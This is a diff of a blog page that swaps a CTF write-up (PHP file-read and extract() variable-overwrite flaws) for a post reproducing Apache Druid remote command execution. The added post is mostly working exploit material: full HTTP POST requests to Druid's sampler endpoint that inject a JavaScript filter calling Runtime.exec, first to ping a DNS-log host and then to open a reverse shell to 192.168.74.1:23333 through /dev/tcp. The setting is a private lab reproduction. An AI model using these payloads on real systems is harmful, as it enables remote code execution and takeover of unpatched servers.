@@ -4,14 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DDCTF-web1, Danie1&#39;s Blog">
-    <meta name="description" content="DDCTF-WEB1
-首先观察链接发现可能存在文件包含，且jpg参数是经过一次base16，两次base64加密后的，所以构造payload读取index.php
-
-base64解码后得到index.php
-&amp;lt;?php
-/*
- * h">
+    <meta name="keywords" content="Apache Druid 远程命令执行漏洞复现, Danie1&#39;s Blog">
+    <meta name="description" content="Apache Druid 远程命令执行漏洞复现
+使用docker搭建环境
+docker pull fokkodriesprong/docker-druid
+docker run --rm -i -p 8888:8888 fokkodries">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +16,7 @@ base64解码后得到index.php
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>DDCTF-web1 | Danie1&#39;s Blog</title>
+    <title>Apache Druid 远程命令执行漏洞复现 | Danie1&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -265,12 +262,12 @@ base64解码后得到index.php
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DDCTF-web1</h1>
+                    <h1 class="description center-align post-title">Apache Druid 远程命令执行漏洞复现</h1>
                 </div>
             </div>
         </div>
@@ -387,8 +384,12 @@ base64解码后得到index.php
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                                <span class="chip bg-color">命令执行</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
                     </div>
@@ -399,8 +400,8 @@ base64解码后得到index.php
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF/" class="post-category">
-                                CTF
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
                             </a>
                         
                     </div>
@@ -412,7 +413,7 @@ base64解码后得到index.php
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-08-20
+                    2021-02-02
                 </div>
                 
 
@@ -429,62 +430,51 @@ base64解码后得到index.php
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="DDCTF-WEB1"><a href="#DDCTF-WEB1" class="headerlink" title="DDCTF-WEB1"></a>DDCTF-WEB1</h1><hr>
-<p>首先观察链接发现可能存在文件包含，且jpg参数是经过一次base16，两次base64加密后的，所以构造payload读取index.php</p>
-<p><img src="https://raw.githubusercontent.com/Danie1233/img/master/ddctf-wen11.png"></p>
-<p>base64解码后得到index.php</p>
-<pre><code class="php">&lt;?php
-/*
- * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
- * Date: July 4,2018
- */
-error_reporting(E_ALL || ~E_NOTICE);
+                <h1 id="Apache-Druid-远程命令执行漏洞复现"><a href="#Apache-Druid-远程命令执行漏洞复现" class="headerlink" title="Apache Druid 远程命令执行漏洞复现"></a>Apache Druid 远程命令执行漏洞复现</h1><hr>
+<p>使用docker搭建环境</p>
+<pre><code class="txt">docker pull fokkodriesprong/docker-druid
+docker run --rm -i -p 8888:8888 fokkodriesprong/docker-druid</code></pre>
+<p>漏洞位置在</p>
+<p>Load data -&gt; Local disk</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210203100802.png"></p>
+<p>依次填入</p>
+<p><strong><em>Base directory:</em></strong></p>
+<p><code>quickstart/tutorial/</code></p>
+<p><strong><em>File filter:</em></strong></p>
+<p><code>wikiticker-2015-09-12-sampled.json.gz</code></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210203100848.png"></p>
+<p>默认next，到schema项，发送POC</p>
+<p>POC:</p>
+<pre><code class="txt">POST /druid/indexer/v1/sampler?for=schema HTTP/1.1
+Host: 192.168.74.133:8888
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=utf-8
+Content-Length: 629
+Origin: http://192.168.74.133:8888
+Connection: close
+Referer: http://192.168.74.133:8888/unified-console.html
 
+&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;firehose&quot;:&#123;&quot;type&quot;:&quot;local&quot;,&quot;baseDir&quot;:&quot;quickstart/tutorial/&quot;,&quot;filter&quot;:&quot;wikiticker-2015-09-12-sampled.json.gz&quot;&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;parser&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;parseSpec&quot;:&#123;&quot;format&quot;:&quot;json&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;time&quot;,&quot;format&quot;:&quot;iso&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;&#125;,&quot;transformSpec&quot;:&#123;&quot;transforms&quot;:[],&quot;filter&quot;:&#123;&quot;type&quot;:&quot;javascript&quot;,    &quot;function&quot;:&quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#39;ping 7ca9b8.dnslog.cn&#39;)&#125;&quot;,    &quot;dimension&quot;:&quot;added&quot;,    &quot;&quot;:&#123;    &quot;enabled&quot;:&quot;true&quot;    &#125;&#125;&#125;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;cacheKey&quot;:&quot;7934a2669d61421db3882515f48fd7ad&quot;&#125;&#125;</code></pre>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210203102653.png"></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210203102702.png"></p>
+<p>反弹shell：</p>
+<pre><code class="txt">POST /druid/indexer/v1/sampler?for=schema HTTP/1.1
+Host: 192.168.74.133:8888
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=utf-8
+Content-Length: 678
+Origin: http://192.168.74.133:8888
+Connection: close
+Referer: http://192.168.74.133:8888/unified-console.html
 
-header(&#39;content-type:text/html;charset=utf-8&#39;);
-if(! isset($_GET[&#39;jpg&#39;]))
-    header(&#39;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#39;);
-$file = hex2bin(base64_decode(base64_decode($_GET[&#39;jpg&#39;])));
-echo &#39;&lt;title&gt;&#39;.$_GET[&#39;jpg&#39;].&#39;&lt;/title&gt;&#39;;
-$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);
-echo $file.&#39;&lt;/br&gt;&#39;;
-$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);
-echo $file.&#39;&lt;/br&gt;&#39;;
-$txt = base64_encode(file_get_contents($file));
-
-echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;/img&gt;&quot;;
-/*
- * Can you find the flag file?
- *
- */
-
-?&gt;
-</code></pre>
-<p>在index.php源码中博客发现存在practice.txt.swp文件</p>
-<p><img src="https://raw.githubusercontent.com/Danie1233/img/master/ddctf-web12.png"></p>
-<p>然后继续使用文件包含读取f1ag!ddctf.php文件，（读取时要将!换成config，因为index.php替换了)</p>
-<p><img src="https://raw.githubusercontent.com/Danie1233/img/master/ddctf_web1.png"></p>
-<p>base64解码得到f1ag!ddctf.php文件源码</p>
-<pre><code class="php">&lt;?php
-include(&#39;config.php&#39;);
-$k = &#39;hello&#39;;
-extract($_GET);
-if(isset($uid))
-&#123;
-    $content=trim(file_get_contents($k));
-    if($uid==$content)
-    &#123;
-        echo $flag;
-    &#125;
-    else
-    &#123;
-        echo&#39;hello&#39;;
-    &#125;
-&#125;
-
-?&gt;</code></pre>
-<p>很明显变量覆盖，构造payload，得到flag.</p>
-<p><img src="https://raw.githubusercontent.com/Danie1233/img/master/ddctf-web13.png"></p>
+&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;firehose&quot;:&#123;&quot;type&quot;:&quot;local&quot;,&quot;baseDir&quot;:&quot;quickstart/tutorial/&quot;,&quot;filter&quot;:&quot;wikiticker-2015-09-12-sampled.json.gz&quot;&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;parser&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;parseSpec&quot;:&#123;&quot;format&quot;:&quot;json&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;time&quot;,&quot;format&quot;:&quot;iso&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;&#125;,&quot;transformSpec&quot;:&#123;&quot;transforms&quot;:[],&quot;filter&quot;:&#123;&quot;type&quot;:&quot;javascript&quot;,    &quot;function&quot;:&quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#39;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.74.1/23333 0&gt;&amp;1&#39;)&#125;&quot;,    &quot;dimension&quot;:&quot;added&quot;,    &quot;&quot;:&#123;    &quot;enabled&quot;:&quot;true&quot;    &#125;&#125;&#125;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;cacheKey&quot;:&quot;7934a2669d61421db3882515f48fd7ad&quot;&#125;&#125;</code></pre>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210203102330.png"></p>
 
             </div>
             <hr/>
@@ -510,7 +500,7 @@ if(isset($uid))
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://danie1233.github.io/2019/08/20/DDCTF-web1/">https://danie1233.github.io/2019/08/20/DDCTF-web1/</a>
+                    <a href="https://danie1233.github.io/2021/02/02/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://danie1233.github.io/2021/02/02/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -548,8 +538,12 @@ if(isset($uid))
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                                    <span class="chip bg-color">命令执行</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
                                 </a>
                             
                         </div>
@@ -590,52 +584,55 @@ if(isset($uid))
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/08/24/rot13/">
+                <a href="/2021/02/02/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="ROT13">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Apache Druid 远程命令执行漏洞复现">
                         
-                        <span class="card-title">ROT13</span>
+                        <span class="card-title">Apache Druid 远程命令执行漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            rot13rot13是凯撒的一种变种，仅仅只需要检查字母顺序并取代它在13位之后的对应字母
-python实现
-# -*-coding:utf-8-*-
-
-def rot13_decode(s):
-    res=&quot;&quot;
- 
+                            Apache Druid 远程命令执行漏洞复现
+使用docker搭建环境
+docker pull fokkodriesprong/docker-druid
+docker run --rm -i -p 8888:8888 fokkodries
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-08-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                        <span class="chip bg-color">命令执行</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -649,35 +646,36 @@ def rot13_decode(s):
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/08/05/CTF%E5%85%A5%E5%9D%91/">
+                <a href="/2021/01/22/Weblogic%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2021-2109%20%EF%BC%89%E5%A4%8D%E7%8E%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/26.jpg" class="responsive-img" alt="CTF入坑">
+                        <img src="/medias/featureimages/33.jpg" class="responsive-img" alt="Weblogic Server远程代码执行（CVE-2021-2109 ）复现">
                         
-                        <span class="card-title">CTF入坑</span>
+                        <span class="card-title">Weblogic Server远程代码执行（CVE-2021-2109 ）复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            Weblogic Server远程代码执行（CVE-2021-2109 ）复现使用vulhub里的weblogic靶场进行搭建。
+http://192.168.74.133:7001/console/
 
-
-CTF学习前言本内容主要以解题模式为学习重点，由Stalker-16成员(Danie1,7iny)整理。
-day01–7iny解题模式CTF赛题目类别与能力对应· Web-Web应用的漏洞挖掘和利用· PWN-逆向分析、漏洞挖掘、漏洞
+漏洞复现：
+启动LDAP
+下载地址：
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-08-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-22
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
@@ -687,8 +685,8 @@ day01–7iny解题模式CTF赛题目类别与能力对应· Web-Web应用的漏�
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
